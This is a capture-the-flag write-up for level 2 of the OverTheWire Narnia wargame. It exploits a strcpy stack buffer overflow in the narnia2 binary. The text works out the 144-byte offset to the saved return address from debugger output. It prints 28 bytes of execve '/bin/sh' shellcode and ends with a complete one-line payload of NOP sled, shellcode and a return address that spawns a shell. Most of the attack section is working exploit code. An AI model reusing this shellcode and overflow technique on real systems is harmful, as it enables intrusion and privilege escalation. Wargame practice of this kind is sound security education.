Challenge URL is <a href="http://www.overthewire.org/wargames/narnia/narnia2.shtml">HERE</a>

<<CHALLENGE_CONTENT
Level 2

There is no information for this level.
If you would like to see the description of this level expanded, please consider to contribute to OTW!

CHALLENGE_CONTENT
	- The program is located at /narnia/narnia2
	- Source code is at /narnia/narnia2.c
	- From the head of source code:
	
		int main(int argc, char * argv[]){
		char buf[128];

	We can roughly predict how many characters that needs to overflow the saved EIP. Because of the structure of function call is 
	
		[local vars , junk, saved frame, saved EIP, arguments]
	
	In this case, it becomes
	
		[
		buf(128 bytes)			<<< buf = 0xffffd640
		----------------------
		<junk ... bytes>
		----------------------
		saved frame(4 bytes), 	<<< $ebp = 0xffffd6c8
		saved EIP(4 bytes), 	<<< saved EIP = 0xffffd6cc
		argc(4 bytes), 			<<< &argc = $ebp+8 = 0xffffd6d0
		&argv(4 bytes), 		<<< &argv = $ebp+12 = 0xffffd6d4
		]
	
	If we can put data into 'buf', we will need 0xffffd6cc - 0xffffd640 + 4 = 144 characters to completely overwrite saved EIP

	- Since 'buf' has length of 128 characters, meaning we can put the shellcode into it no more than 128 bytes too.

	- Debugging:
	   0x08048438 <+52>:	mov    0xc(%ebp),%eax	<<getting ARGV[1]
	   0x0804843b <+55>:	add    $0x4,%eax
	   0x0804843e <+58>:	mov    (%eax),%eax
	   0x08048440 <+60>:	mov    %eax,0x4(%esp)	<<end getting ARGV[1]
		0x08048444 <+64>:	lea    0x10(%esp),%eax
		0x08048448 <+68>:	mov    %eax,(%esp)
	  * 0x0804844b <+71>:	call   0x8048314 <strcpy@plt>

	'buf' seems to be located at 0x10+$esp ==> 0xffffd640

	- Now we can construct our payload to overwrite saved EIP, and point back to our shell code. 
	- I created payload like this:
		[ NOP*4 + SHELLCODE(28 bytes)+ NOP*108 + return_address(4 bytes) ]

	and return_address point back to the begining of our payload, which is address of 'buf', which equals to 0xffffd640

	- Shellcode with setreuid() from http://www.shell-storm.org/shellcode/files/shellcode-811.php (28bytes)
		"\x31\xc0\x50\x68\x2f\x2f\x73"
		"\x68\x68\x2f\x62\x69\x6e\x89"
		"\xe3\x89\xc1\x89\xc2\xb0\x0b"
		"\xcd\x80\x31\xc0\x40\xcd\x80"

	/narnia/narnia2 $(python -c 'print "\x90"*4 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*108+"\x40\xd6\xff\xff"') 
